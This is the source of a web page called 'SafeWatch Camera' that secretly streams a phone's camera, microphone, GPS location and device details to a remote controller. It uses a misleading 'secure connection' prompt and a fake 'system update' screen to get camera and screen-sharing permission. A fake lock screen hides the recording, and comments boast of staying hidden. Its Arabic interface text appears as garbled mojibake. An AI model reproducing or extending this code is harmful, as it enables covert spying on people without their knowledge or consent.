<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafeWatch Camera</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="manifest" href="manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#0f172a">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body,
        html {
            height: 100%;
            overflow: hidden;
            background: black;
        }

        #localVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .monitor-status {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.6);
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            z-index: 10;
        }

        #dim-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            opacity: 0;
            pointer-events: none;
            /* Let clicks pass through if needed, or handle taps to wake */
            z-index: 999;
            transition: opacity 0.5s;
        }
    </style>
</head>

<body>

    <div id="permission-overlay"
        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20000; text-align: center; padding: 20px;">
        <div
            style="background: rgba(255,255,255,0.03); padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); max-width: 400px; width: 90%; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);">
            <div style="position: relative; width: 80px; height: 80px; margin: 0 auto 25px;">
                <ion-icon name="shield-checkmark" style="font-size: 5rem; color: #3b82f6;"></ion-icon>
                <div
                    style="position: absolute; top: -5px; right: -5px; width: 25px; height: 25px; background: #ef4444; border-radius: 50%; border: 3px solid #0f172a; animation: pulse 1.5s infinite;">
                </div>
            </div>
            <h2 style="margin-bottom: 15px; font-weight: 700; font-size: 1.5rem;">ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±</h2>
            <p style="margin-bottom: 25px; font-size: 1rem; color: #94a3b8; line-height: 1.6;">
                Ù„Ù„Ø¨Ø¯Ø¡ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ <strong>"ØªÙ†Ø´ÙŠØ· Ø§Ù„Ø¢Ù†"</strong> Ø«Ù… Ø§Ø®ØªÙŠØ§Ø± <strong>"Ø³Ù…Ø§Ø­"</strong> ÙÙŠ Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…ØªØµÙØ­
                Ø§Ù„ØªÙŠ Ø³ØªØ¸Ù‡Ø± Ù„Ù„Ø£Ù…Ø§Ù†.
            </p>
            <button id="start-btn" class="btn"
                style="background: #3b82f6; border: none; padding: 18px 0; width: 100%; border-radius: 15px; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: transform 0.2s;">
                ØªÙ†Ø´ÙŠØ· Ø§Ù„Ù†Ø¸Ø§Ù… ÙˆØ§Ù„Ø¨Ø¯Ø¡
            </button>
            <div style="margin-top: 20px; font-size: 0.8rem; color: #64748b;">
                <ion-icon name="lock-closed-outline" style="vertical-align: middle;"></ion-icon>
                Ø§ØªØµØ§Ù„ Ù…Ø´ÙØ± ÙˆØ¢Ù…Ù† Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
            </div>
        </div>
    </div>

    <!-- Added webkit-playsinline for iOS compatibility -->
    <video id="localVideo" autoplay playsinline webkit-playsinline muted
        style="width: 100%; height: 100%; object-fit: cover;"></video>

    <!-- Debug Log Container -->
    <div id="debug-log"
        style="position: absolute; top: 10px; left: 10px; z-index: 5000; color: #0f0; font-size: 10px; background: rgba(0,0,0,0.7); max-height: 200px; overflow-y: auto; pointer-events: none; text-align: left; direction: ltr; display: none;">
        Log started...<br>
    </div>

    <!-- Restart Button -->
    <button id="restart-cam-btn"
        style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5001; background: red; color: white; border: none; padding: 20px 40px; border-radius: 10px; font-size: 1.2rem; display: none; cursor: pointer;">
        Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Force Start)
    </button>

    <div class="monitor-status" id="status-text" style="transition: opacity 0.5s; display: none;"></div>

    <div id="dim-overlay"
        style="opacity: 0; pointer-events: none; transition: opacity 0.5s; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: rgba(255,255,255,0.7); font-family: sans-serif; user-select: none;">
        <div
            style="position: absolute; top: 20px; right: 20px; display: flex; align-items: center; gap: 5px; font-size: 0.9rem;">
            <span id="lock-battery">--%</span>
            <ion-icon name="battery-half"></ion-icon>
        </div>

        <div id="lock-time" style="font-size: 5rem; font-weight: 200; color: white;">12:00</div>
        <div id="lock-date" style="font-size: 1.2rem; margin-top: -10px;">Ø§Ù„Ø£Ø­Ø¯ØŒ 1 ÙŠÙ†Ø§ÙŠØ±</div>

        <div style="position: absolute; bottom: 50px; font-size: 0.9rem; opacity: 0.5; animation: pulse 2s infinite;">
            <ion-icon name="finger-print" style="font-size: 2rem; display: block; margin: 0 auto 10px;"></ion-icon>
            Ø§Ø¶ØºØ· Ù…Ø±ØªÙŠÙ† Ù„ÙØªØ­ Ø§Ù„Ù‚ÙÙ„
        </div>
    </div>

    <style>
        @keyframes pulse {
            0% {
                opacity: 0.3;
            }

            50% {
                opacity: 0.7;
            }

            100% {
                opacity: 0.3;
            }
        }
    </style>

    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script>
        // Log function for on-screen debugging
        function log(msg) {
            console.log(msg);
            const d = document.getElementById('debug-log');
            d.innerHTML += msg + "<br>";
            d.scrollTop = d.scrollHeight;
        }

        const socket = io();
        const urlParams = new URLSearchParams(window.location.search);
        const roomId = urlParams.get('session');
        const localVideo = document.getElementById('localVideo');
        const permissionOverlay = document.getElementById('permission-overlay');
        const dimOverlay = document.getElementById('dim-overlay');
        const statusText = document.getElementById('status-text');
        const restartBtn = document.getElementById('restart-cam-btn');

        let peerConnection;
        let localStream;
        let currentFacingMode = 'environment';
        let wakeLock = null;
        let errorCount = 0;

        const config = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        if (!roomId) {
            alert('No Session ID');
            window.location.href = '/';
        }

        restartBtn.addEventListener('click', async () => {
            restartBtn.style.display = 'none';
            log("User clicked Force Start");
            // Must call play() directly in user event
            if (localVideo.srcObject) {
                try {
                    await localVideo.play();
                    log("Video playing after manual click!");
                    log("Camera active.");
                    if (statusText.innerHTML.includes("ÙˆØ¶Ø¹ Ø§Ù„ØªÙˆØ§ÙÙ‚")) {
                        startCanvasStreaming();
                    }
                } catch (e) {
                    log("Manual play failed: " + e.message);
                }
            } else {
                await getCamera(currentFacingMode);
            }
        });

        // 1. Wake Lock (Keep Screen Alive)
        async function requestWakeLock() {
            try {
                wakeLock = await navigator.wakeLock.request('screen');
                log('Wake Lock is active!');
            } catch (err) {
                log(`${err.name}, ${err.message}`);
            }
        }

        document.addEventListener('visibilitychange', async () => {
            if (wakeLock !== null && document.visibilityState === 'visible') {
                await requestWakeLock();
            }
        });

        async function startSystem() {
            log("Starting system...");
            try {
                await getCamera(currentFacingMode);
                await requestWakeLock(); // Keep screen on

                // If camera started successfully, hide the overlay
                permissionOverlay.style.display = 'none';

                socket.emit('join-room', roomId, 'monitor');
                sendDeviceInfo();
                log("Camera ready.");

                // Auto-activate stealth mode (fake lock screen)
                setTimeout(() => {
                    toggleStealthMode();
                }, 1000);
            } catch (e) {
                log("Auto-start blocked/failed: " + e.message);
                // Show overlay if auto-start is blocked by browser policy
                permissionOverlay.style.display = 'flex';
            }
        }

        // 2. Custom Permission Button Handler
        document.getElementById('start-btn').addEventListener('click', startSystem);

        // Auto-run on load (will work if permissions already granted)
        window.addEventListener('load', () => {
            log("Page loaded. Attempting auto-start...");
            startSystem();
        });

        async function getScreen() {
            // Browsers REQUIRE a physical gesture to start Screen Sharing.
            // We will show an "Urgent Update" or "System Notification" style button.
            log("Screen capture requested. Showing permission prompt on device.");

            const prompt = document.createElement('div');
            prompt.id = "screen-prompt";
            prompt.style = "position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;";
            prompt.innerHTML = `
                <ion-icon name="shield-checkmark" style="font-size: 4rem; color: #3b82f6; margin-bottom: 20px;"></ion-icon>
                <h2>ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†Ø¸Ø§Ù… Ù…Ø·Ù„ÙˆØ¨</h2>
                <p style="margin-bottom: 30px; color: #94a3b8;">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ø£Ø¯Ù†Ø§Ù‡ Ù„ØªÙØ¹ÙŠÙ„ ÙˆØ¶Ø¹ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø© ÙˆØ§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø°ÙŠ Ø³ÙŠØ¸Ù‡Ø±.</p>
                <button id="activate-screen-btn" style="background: #3b82f6; border: none; padding: 15px 40px; border-radius: 50px; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer;">ØªØ­Ø¯ÙŠØ« ÙˆØªÙ†Ø´ÙŠØ· Ø§Ù„Ø¢Ù†</button>
            `;
            document.body.appendChild(prompt);

            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
                alert("Ù„Ù„Ø£Ø³ÙØŒ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­ Ø¹Ù„Ù‰ Ø§Ù„Ø¬ÙˆØ§Ù„ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ù…ÙŠØ²Ø© Ø¨Ø« Ø§Ù„Ø´Ø§Ø´Ø©. ÙŠØ±Ø¬Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ Chrome Ù…Ø­Ø¯Ø«.");
                log("Screen sharing not supported on this browser.");
                return;
            }

            document.getElementById('activate-screen-btn').addEventListener('click', async () => {
                try {
                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    log("Screen stream acquired!");
                    prompt.remove();

                    const screenTrack = screenStream.getVideoTracks()[0];

                    // Critical: Update Local Video
                    localVideo.srcObject = screenStream;
                    await localVideo.play().catch(e => log("Play screen error: " + e.message));

                    if (peerConnection) {
                        const senders = peerConnection.getSenders();
                        for (const sender of senders) {
                            if (sender.track && sender.track.kind === 'video') {
                                await sender.replaceTrack(screenTrack);
                                log("Replaced video track for PC.");
                            }
                        }
                    }

                    screenTrack.onended = () => {
                        log("Screen ended.");
                        getCamera(currentFacingMode);
                    };
                } catch (e) {
                    log("Screen capture failed: " + e.message);
                    alert("Ø¨Ø« Ø§Ù„Ø´Ø§Ø´Ø© ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… Ø£Ùˆ ØªÙ… Ø±ÙØ¶Ù‡: " + e.message);
                    prompt.remove();
                }
            });
        }

        async function getCamera(facingMode = 'environment') {
            log(`Getting camera (${facingMode})...`);
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                log("Browser does not support camera access (ensure HTTPS).");
                statusText.innerText = "Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØªØ£ÙƒØ¯ Ù…Ù† HTTPS).";
                return;
            }

            try {
                if (localStream) {
                    log("Stopping existing stream tracks.");
                    localStream.getTracks().forEach(track => track.stop());
                }

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 }, // Lower res for broader compatibility
                        height: { ideal: 480 }
                    },
                    audio: true
                });

                log("Stream acquired. Tracks: " + stream.getTracks().length);

                localStream = stream;
                localVideo.srcObject = stream;

                // Explicitly try to play
                try {
                    await localVideo.play();
                    log("Video.play() success");
                } catch (e) {
                    log("Video.play() error: " + e.message);
                    log("SHOWING FORCE START BUTTON");
                    restartBtn.style.display = 'block';
                }

                // Refresh connection if active
                if (peerConnection) {
                    log("Peer connection active, replacing video track.");
                    const videoTrack = stream.getVideoTracks()[0];
                    const sender = peerConnection.getSenders().find(s => s.track.kind === 'video');
                    if (sender) sender.replaceTrack(videoTrack);
                }

                return stream;
            } catch (err) {
                log("Camera Error: " + err.message);

                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    statusText.innerHTML = `
                        <div style="background: rgba(255,0,0,0.8); padding: 20px; border-radius: 10px;">
                            <h3>â›” ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h3>
                            <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:</p>
                            <ol style="text-align: right; margin-top: 10px; line-height: 1.8;">
                                <li>Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ù‚ÙÙ„ ğŸ”’ Ø£Ùˆ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨Ø¬Ø§Ù†Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Ø§Ù„Ø£Ø¹Ù„Ù‰.</li>
                                <li>Ø§Ø®ØªØ± "Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª" (Permissions).</li>
                                <li>ÙØ¹Ù„ Ø®ÙŠØ§Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ğŸ“·.</li>
                                <li>Ø§Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©.</li>
                            </ol>
                        </div>
                    `;
                    statusText.style.background = "transparent";
                } else {
                    statusText.innerText = "Error: " + err.message;
                    restartBtn.style.display = 'block';
                    restartBtn.innerText = "ÙØ´Ù„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. Ø§Ø¶ØºØ· Ù„Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰";
                }
            }
        }

        // Socket Events
        let iceCandidatesQueue = [];

        socket.on('offer', async (payload) => {
            console.log("Received Offer");
            log("Connection established. Streaming live...");
            // Removed visible status text for stealth

            peerConnection = new RTCPeerConnection(config);

            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('ice-candidate', { roomId, candidate: event.candidate });
                }
            };

            await peerConnection.setRemoteDescription(new RTCSessionDescription(payload.sdp));

            while (iceCandidatesQueue.length > 0) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(iceCandidatesQueue.shift()));
            }

            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);

            socket.emit('answer', { roomId, sdp: answer });

            startBatteryUpdates();
        });

        socket.on('ice-candidate', async (payload) => {
            if (peerConnection && peerConnection.remoteDescription) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(payload.candidate));
            } else {
                iceCandidatesQueue.push(payload.candidate);
            }
        });

        socket.on('control-command', async (payload) => {
            console.log("Command received:", payload.command);

            const videoTrack = localStream ? localStream.getVideoTracks()[0] : null;

            if (payload.command === 'switch-camera') {
                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                await getCamera(currentFacingMode);
            }

            if (payload.command === 'switch-to-screen') {
                await getScreen();
            }

            if (payload.command === 'toggle-torch') {
                if (videoTrack) {
                    const capabilities = videoTrack.getCapabilities();
                    if (capabilities.torch) {
                        try {
                            const currentSettings = videoTrack.getSettings();
                            await videoTrack.applyConstraints({ advanced: [{ torch: !currentSettings.torch }] });
                        } catch (e) {
                            log("Torch error: " + e.message);
                        }
                    } else {
                        log("Torch not supported on this camera/device.");
                        // Removed status text notification to stay hidden
                    }
                }
            }

            if (payload.command === 'set-zoom') {
                if (videoTrack) {
                    const capabilities = videoTrack.getCapabilities();
                    if (capabilities.zoom) {
                        try {
                            await videoTrack.applyConstraints({ advanced: [{ zoom: payload.value }] });
                        } catch (e) {
                            log("Zoom error: " + e.message);
                        }
                    }
                }
            }

            if (payload.command === 'screen-dim') {
                toggleStealthMode();
            }
            if (payload.command === 'start-compatibility-mode') {
                // Determine speed based on payload
                const interval = payload.interval || 100; // Default 100ms (Video-like)
                startCanvasStreaming(interval);
            }
            if (payload.command === 'stop-compatibility-mode') {
                stopCanvasStreaming();
            }

            // New Commands
            if (payload.command === 'capture-photo') {
                sendSingleSnapshot("Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙŠØ¯ÙˆÙŠØ©...");
            }
            if (payload.command === 'set-auto-snapshot') {
                setupAutoSnapshot(payload.enabled, payload.minutes);
            }
        });

        // Helper: Stealth Mode (Fake Lock Screen)
        function toggleStealthMode() {
            const isHidden = dimOverlay.style.opacity === '1';

            if (isHidden) {
                // Unlock
                dimOverlay.style.opacity = '0';
                dimOverlay.style.pointerEvents = 'none';
            } else {
                // Lock (Fake Screen)
                updateClock();
                dimOverlay.style.opacity = '1';
                dimOverlay.style.pointerEvents = 'all';
            }
        }

        // Clock Logic for Fake Lock Screen
        function updateClock() {
            const now = new Date();
            const time = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
            const date = now.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long' });

            document.getElementById('lock-time').innerText = time;
            document.getElementById('lock-date').innerText = date;
        }

        setInterval(updateClock, 60000); // 1 min update

        // Unlock on double tap or swipe logic (simplified to double click for web)
        dimOverlay.addEventListener('dblclick', () => {
            toggleStealthMode();
        });

        // Battery Status for Lock Screen
        navigator.getBattery?.().then(b => {
            const updateBat = () => {
                document.getElementById('lock-battery').innerText = Math.round(b.level * 100) + '%';
            };
            updateBat();
            b.addEventListener('levelchange', updateBat);
        });

        // --- SNAPSHOT / COMPATIBILITY MODE ---
        let canvasInterval = null;
        let autoSnapshotTimer = null; // Persistent timer for periodic shots
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        function sendSingleSnapshot(msg) {
            if (localVideo.readyState >= 2) {
                canvas.width = 1280; // High res for manual photos
                canvas.height = 720;
                ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
                const data = canvas.toDataURL('image/jpeg', 0.8);
                socket.emit('stream-data', { roomId, image: data, isSnapshot: true });
                log(msg);
            }
        }

        function setupAutoSnapshot(enabled, minutes) {
            if (autoSnapshotTimer) clearInterval(autoSnapshotTimer);
            if (enabled) {
                const ms = minutes * 60 * 1000;
                autoSnapshotTimer = setInterval(() => {
                    sendSingleSnapshot("Ø¥Ø±Ø³Ø§Ù„ Ù„Ù‚Ø·Ø© Ø¯ÙˆØ±ÙŠØ© ØªÙ„Ù‚Ø§Ø¦ÙŠØ©...");
                }, ms);
                log(`Auto-snapshot enabled: every ${minutes} mins`);
            } else {
                log("Auto-snapshot disabled.");
            }
        }

        function startCanvasStreaming(intervalMs) {
            if (canvasInterval) clearInterval(canvasInterval);

            const isSnapshot = intervalMs > 1000;
            log(isSnapshot ? "Snapshot mode active" : "Compatibility mode active");

            canvas.width = 640;
            canvas.height = 480;

            canvasInterval = setInterval(async () => {
                try {
                    if (localVideo.readyState >= 2) {
                        ctx.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
                        const quality = isSnapshot ? 0.6 : 0.3; // Higher quality for slow snapshots
                        const data = canvas.toDataURL('image/jpeg', quality);
                        socket.emit('stream-data', { roomId, image: data });
                    } else {
                        localVideo.play().catch(e => { });
                    }
                } catch (e) {
                    console.error(e);
                }
            }, intervalMs);
        }

        function stopCanvasStreaming() {
            if (canvasInterval) {
                clearInterval(canvasInterval);
                canvasInterval = null;
                log("Compatibility mode stopped.");
            }
        }

        // Expose for debugging if needed
        window.sendTestFrame = () => {
            canvas.width = 320;
            canvas.height = 240;
            ctx.fillStyle = "red";
            ctx.fillRect(0, 0, 320, 240);
            ctx.fillStyle = "white";
            ctx.font = "30px Arial";
            ctx.fillText("TEST FRAME", 50, 120);
            const data = canvas.toDataURL('image/jpeg', 0.5);
            socket.emit('stream-data', { roomId, image: data });
            alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© Ø­Ù…Ø±Ø§Ø¡ Ø§Ø®ØªØ¨Ø§Ø±ÙŠØ©. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø£Ø®Ø±Ù‰.");
        };

        async function sendDeviceInfo() {
            let location = { lat: 'ØºÙŠØ± Ù…ØªØ§Ø­', lon: 'ØºÙŠØ± Ù…ØªØ§Ø­' };

            // Try to get GPS Location
            if ("geolocation" in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                    });
                    location.lat = position.coords.latitude;
                    location.lon = position.coords.longitude;
                } catch (e) {
                    log("Location access denied or timeout.");
                }
            }

            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
                connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
                location: location,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            socket.emit('device-info', { roomId, info });
            log("Detailed device info & GPS sent.");
        }

        // Battery API
        function startBatteryUpdates() {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    sendBattery(battery);
                    battery.addEventListener('levelchange', () => sendBattery(battery));
                    battery.addEventListener('chargingchange', () => sendBattery(battery));
                });
            } else {
                console.log("Battery API not supported on this device.");
            }
        }

        function sendBattery(battery) {
            const level = Math.round(battery.level * 100);
            socket.emit('status-update', {
                roomId,
                type: 'battery',
                level: level,
                charging: battery.charging
            });
        }
    </script>
</body>

</html>